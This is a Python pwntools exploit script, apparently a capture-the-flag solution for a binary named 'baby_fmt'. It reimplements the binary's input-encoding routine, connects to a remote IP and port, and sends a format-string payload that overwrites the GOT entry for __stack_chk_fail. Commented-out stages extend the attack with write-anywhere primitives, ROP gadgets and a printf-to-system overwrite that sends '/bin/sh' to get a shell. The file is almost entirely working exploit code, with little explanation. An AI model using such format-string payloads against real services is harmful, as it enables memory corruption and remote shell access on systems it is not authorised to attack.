from pwn import *

def case1(temp, local_10):
    # import pdb; pdb.set_trace()
    if ((temp < ord('a')) or (ord('z') < temp)):
        if ((temp < ord('0')) or (ord('9') < temp)):
            if ((temp < ord('A')) or (ord('Z') < temp)):
                if ((temp == ord('%')) and (temp == ord('$'))):
                    return True
            else:
                return False
        elif (temp + (local_10 % 7) < 0x3a):
            return True
        else:
            return False
    elif (temp + (local_10 % 7) < 0x7b):
        return True
    else:
        return False

def case2(temp, local_10):
    if ((temp < ord('a')) or (ord('z') < temp)):
        if ((temp < ord('0')) or (ord('9') < temp)):
            if ((temp < ord('A')) or (ord('Z') < temp)):
                if ((temp == ord('%')) and (temp == ord('$'))):
                    return False
            else:
                return False
        elif (temp + (local_10 % 7) < 0x3a):
            return False
        else:
            return True
    elif (temp + (local_10 % 7) < 0x7b):
        return False
    else:
        return False

def case3(temp, local_10):
    if ((temp < ord('a')) or (ord('z') < temp)):
        if ((temp < ord('0')) or (ord('9') < temp)):
            if ((temp < ord('A')) or (ord('Z') < temp)):
                if ((temp == ord('%')) and (temp == ord('$'))):
                    return False
            else:
                return False
        elif (temp + (local_10 % 7) < 0x3a):
            return False
        else:
            return False
    elif (temp + (local_10 % 7) < 0x7b):
        return False
    else:
        return True

def case4(temp, local_10):
    if ((temp < ord('a')) or (ord('z') < temp)):
        if ((temp < ord('0')) or (ord('9') < temp)):
            if ((temp < ord('A')) or (ord('Z') < temp)):
                if ((temp == ord('%')) and (temp == ord('$'))):
                    return False
            else:
                return True
        elif (temp + (local_10 % 7) < 0x3a):
            return False
        else:
            return False
    elif (temp + (local_10 % 7) < 0x7b):
        return False
    else:
        return False

def FUN_004012a8(param_1):
    # param_1 = [ord(i) for i in param_1]
    param_1 = b'fvpqc' + param_1
    result = []
    for local_10 in range(len(param_1)):
        cVar1 = local_10 & 0xff
        temp = (param_1[local_10] - (cVar1 + ((local_10 // 7) * -7))) & 0xff
        if case1(temp, local_10):
            result.append(temp)
            continue

        temp = (param_1[local_10] - (cVar1 + ((local_10 // 7) * -7) - 10)) & 0xff
        if case2(temp, local_10):
            result.append(temp)
            continue

        temp = (param_1[local_10] - (cVar1 + ((local_10 // 7) * -7) - 0x1a)) & 0xff
        if case3(temp, local_10):
            result.append(temp)
            continue

        temp = 0
        if case4(temp, local_10):
            result.append(temp)
            continue

        result.append(param_1[local_10])

    return b'funny'+b''.join([i.to_bytes(1, 'little') for i in result])[5:]

# r = process('./baby_fmt')
r = remote('103.245.249.76', 49158)
bin = ELF('./baby_fmt')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
context.clear(os='linux', arch='x86_64', log_level='debug')

def fmt(payload):
    payload = FUN_004012a8(payload)
    print(payload)
    r.sendlineafter(b'Tell me some funny things!\n', payload)

def debug():
    gdb.attach(r, '''b*0x0000000000401250''')

payload = (f'%{0x15cd-5}c%10$hn'.encode().ljust(0x20-5, b'\0') + \
        p64(bin.got['__stack_chk_fail'])).ljust(0x6f-5, b'\0')
fmt(payload)
r.interactive()

# r.recvuntil(b'_')
# stack = int(r.recv(14), 16)
# log.success('Stack: %#x' % stack)

# leave_ret = 0x00000000004012a6
# pop_rdi_ret = 0x00000000004016d3
# buffer = 0x404510

# def write_anywhere(addr, value):
#     payload = (f'%{value&0xffff}c%10$hn'.encode().ljust(0x20-5, b'\0') + \
#         p64(addr)).ljust(0x6f-5, b'\0')
#     fmt(payload)

#     r.sendlineafter(b'Tell me some funny things!\n', b'\x00'*0x6f)
#     payload = (f'%64c%8$hhn'.encode().ljust(0x10-5, b'\0') + \
#         p64(addr+2)).ljust(0x6f-5, b'\0')
#     fmt(payload)
#     r.sendlineafter(b'Tell me some funny things!\n', b'\x00'*0x6f)

# r.sendlineafter(b'Tell me some funny things!\n', b'\x00'*0x6f)
# # write_anywhere(buffer, pop_rdi_ret)
# # write_anywhere(buffer+0x10, bin.plt['system'])
# # write_anywhere(buffer+8, 0x402025)

# payload = (f'%96c%10$hhn'.encode().ljust(0x20-5, b'\0') + \
#         p64(bin.got['printf'])).ljust(0x6f-5, b'\0')
# fmt(payload)
# r.sendlineafter(b'Tell me some funny things!\n', b'/bin/sh')